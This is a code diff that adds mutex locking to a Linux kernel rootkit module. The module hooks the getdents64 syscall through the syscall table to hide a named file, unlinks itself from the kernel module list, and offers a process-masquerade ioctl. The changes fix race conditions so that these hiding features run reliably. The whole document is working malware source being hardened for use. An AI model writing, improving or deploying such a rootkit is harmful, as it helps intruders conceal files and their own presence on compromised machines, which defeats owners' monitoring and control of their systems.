@@ -17,6 +17,7 @@
 // header pulling this in transitively, that chain is not guaranteed stable
 // across kernel versions.
 #include <linux/string.h>
+#include <linux/mutex.h>
 
 #include "loadable_kernel_module.h"
 
@@ -100,6 +101,10 @@ struct cdev *kernel_cdev;
 // Points to a static empty string initially; replaced by a kmalloc'd buffer in IOCTL_FILE_HIDE.
 // The empty-string sentinel is checked via *HIDDEN_FILE != '\0' before kfree — do not set to NULL.
 char *HIDDEN_FILE = "";
+// Protects HIDDEN_FILE against a reader in hacked_getdents64 racing a concurrent
+// IOCTL_FILE_HIDE writer: without this, the writer's kfree() of the old buffer
+// can run while the reader still holds the stale pointer (use-after-free).
+static DEFINE_MUTEX(hidden_file_lock);
 
 // the necessary variables that the syscall table requires to access and modify 
 static unsigned long *__sys_call_table;
@@ -189,6 +194,10 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
 
 	// printk(KERN_INFO "HIDDEN_FILE: %s\n", HIDDEN_FILE);
 
+	// Hold the lock across the whole scan: HIDDEN_FILE is read (and its contents
+	// dereferenced via strlen/memcmp) throughout the loop below, so it must not
+	// be freed/reassigned by a concurrent IOCTL_FILE_HIDE until we're done.
+	mutex_lock(&hidden_file_lock);
 	while (off < ret) {
 		dir = (void *)kdirent + off;
 		// Guard against malformed dirents with d_reclen == 0; advancing by zero loops forever.
@@ -208,6 +217,7 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
 			prev = dir;
 		off += dir->d_reclen;
 	}
+	mutex_unlock(&hidden_file_lock);
 	err = copy_to_user(dirent, kdirent, ret);
 	if (err)
 		goto out;
@@ -219,6 +229,10 @@ out:
 // hidden module part
 static struct list_head *prev_module;
 static short hidden = 0;
+// Serializes module_hide()/module_show() against each other: without this, two
+// concurrent IOCTL_MOD_HIDE calls can both observe the same stale `hidden` value
+// and both call list_del()/list_add() on THIS_MODULE->list, corrupting it.
+static DEFINE_MUTEX(module_hide_lock);
 void module_show(void)
 {
     /* back to the module list where we remove before */
@@ -310,11 +324,13 @@ static long lkm_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)
 			hook();
 			break;
 		case IOCTL_MOD_HIDE:
+			mutex_lock(&module_hide_lock);
 			if (hidden == 0) {
 				module_hide();
 			} else {
 				module_show();
 			}
+			mutex_unlock(&module_hide_lock);
 			break;
 		case IOCTL_MOD_MASQ:
 			if (copy_from_user(&user_req, (struct masq_proc_req *)arg, sizeof(struct masq_proc_req)))
@@ -358,13 +374,17 @@ static long lkm_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)
 			// Reject zero-length to prevent size_t underflow on the null-terminator write below.
 			if (file_info.len == 0 || file_info.len > NAME_LEN)
 				return -EINVAL;
+			mutex_lock(&hidden_file_lock);
 			if (HIDDEN_FILE && *HIDDEN_FILE != '\0')
 				kfree(HIDDEN_FILE);
 			HIDDEN_FILE = kmalloc(file_info.len, GFP_KERNEL);
-			if (!HIDDEN_FILE)
+			if (!HIDDEN_FILE) {
+				mutex_unlock(&hidden_file_lock);
 				return -ENOMEM;
+			}
 			memcpy(HIDDEN_FILE, file_info.name, file_info.len);
 			HIDDEN_FILE[file_info.len - 1] = '\0';
+			mutex_unlock(&hidden_file_lock);
 			break;
 		default:
 			ret = -EINVAL;
@@ -449,8 +469,10 @@ static void __exit lkm_exit(void)
 	
 	protect_memory();
 
+	mutex_lock(&hidden_file_lock);
 	if (HIDDEN_FILE && *HIDDEN_FILE != '\0')
 		kfree(HIDDEN_FILE);
+	mutex_unlock(&hidden_file_lock);
 
 	pr_info("%s: removed\n", OURMODNAME);
 	cdev_del(kernel_cdev);
